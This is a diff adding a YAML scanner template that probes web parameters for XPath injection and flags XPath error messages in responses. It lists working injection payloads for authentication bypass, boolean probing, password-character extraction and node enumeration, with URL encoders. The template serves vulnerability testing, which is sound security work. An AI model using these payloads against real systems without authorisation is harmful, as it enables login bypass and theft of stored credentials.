@@ -1,0 +1,56 @@
+# templates/xpath-injection/xpath-injection-basic.yaml
+id: xpath-injection-basic
+info:
+  name: XPath Injection Vulnerability Detection
+  author: webx-elite
+  severity: high
+  description: Tests for XPath injection in XML document queries
+  tags:
+    - xpath-injection
+    - injection
+    - xml
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-643
+
+vulnerability_type: xpath-injection
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{xpath_payload}}"
+    
+    matchers:
+      - type: word
+        words:
+          - "javax.xml.transform.TransformerException"
+          - "XPathException"
+          - "xmlXPathEval"
+          - "XPath syntax error"
+          - "Invalid predicate"
+          - "xpath error"
+          - "XPath expression"
+        part: body
+        condition: or
+
+payloads:
+  # Authentication bypass
+  - "' or '1'='1"
+  - "' or 1=1 or ''='"
+  - "x' or name()='username' or 'x'='y"
+  
+  # Boolean-based
+  - "' and count(//*)>0 and ''='"
+  - "' and string-length(name(/*[1]))>0 and ''='"
+  
+  # Data extraction
+  - "' or substring(//user[1]/password,1,1)='a"
+  - "' or contains(//user/password,'admin') or ''='"
+  
+  # Node enumeration
+  - "' or count(/*)>0 or ''='"
+  - "' or name(/*[1])='users' or ''='"
+
+encoders:
+  - url
+  - double_url
